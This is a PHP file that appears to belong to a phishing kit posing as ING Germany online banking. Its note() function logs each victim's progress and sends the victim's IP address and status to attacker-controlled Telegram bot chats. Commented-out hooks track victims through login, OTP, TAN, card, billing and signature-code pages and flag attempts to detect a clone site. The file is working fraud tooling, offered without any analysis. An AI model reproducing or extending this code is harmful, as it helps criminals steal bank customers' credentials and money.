<?php
require '../main.php';





function note($statu)
{
	global $m;
	global $a_ids;
	global $notifs;

	$oldlogs = $m->getData()["LOGS"];
	$newlogs = $oldlogs . "\n- LOG [ $statu ]";
	$arr = array("LOGS" => $newlogs);
	$m->update($arr);

	$ids = explode(",", str_replace(" ", "", $a_ids));

	if ($notifs == "1") {
		foreach ($ids as $id) {
			$msg = urlencode("[ ING-DE NOTIFICATION ]\nVICTIM IP : " . $_SERVER['REMOTE_ADDR'] . "\nSTATU : $statu");
			sendBot($id, $msg);
		}
	}
}


function sendBot($id, $msg)
{
	global $a_bot;
	$url = "https://api.telegram.org/bot$a_bot/sendMessage?chat_id=$id&text=$msg";
	$ci = curl_init();
	curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ci, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ci, CURLOPT_URL, $url);
	return curl_exec($ci);
	curl_close($ci);
}



// if (isset($_POST['otpview'])) {
// 	note("In otp page");
// }
// if (isset($_POST['otping'])) {
// 	note("Entering otp...");
// }


// if (isset($_POST['loginview'])) {
// 	note("In Login page");
// }
// if (isset($_POST['loging'])) {
// 	note("Entering login info...");
// }

// if (isset($_POST['taning'])) {
// 	note("Entering TAN...");
// }
// if (isset($_POST['tanview'])) {
// 	note("In TAN page");
// }

// if (isset($_POST['cardview'])) {
// 	note("In card page");
// }

// if (isset($_POST['carding'])) {
// 	note("Entering card info...");
// }
// if (isset($_POST['carddetailsview'])) {
// 	note("In card details page");
// }

// if (isset($_POST['carddetailsing'])) {
// 	note("Entering card details info...");
// }

// if (isset($_POST['firmaview'])) {
// 	note("In firma page");
// }


// if (isset($_POST['firmaing'])) {
// 	note("Entering firma code...");
// }

// if (isset($_POST['waitingview'])) {
// 	note("Waiting for redirection...");
// }

// if (isset($_POST['appview'])) {
// 	note("Waiting for bank app authorization...");
// }

// if (isset($_POST['billingview'])) {
// 	note("In billing page");
// }
// if (isset($_POST['billinging'])) {
// 	note("Entering billing information...");
// }
// if (isset($_POST['finishview'])) {
// 	note("Success!");
// }
// if (isset($_POST['clonedetect'])) {
// 	note(" + A CLONE TRY HAS BEEN DETECTED!");
// }

?>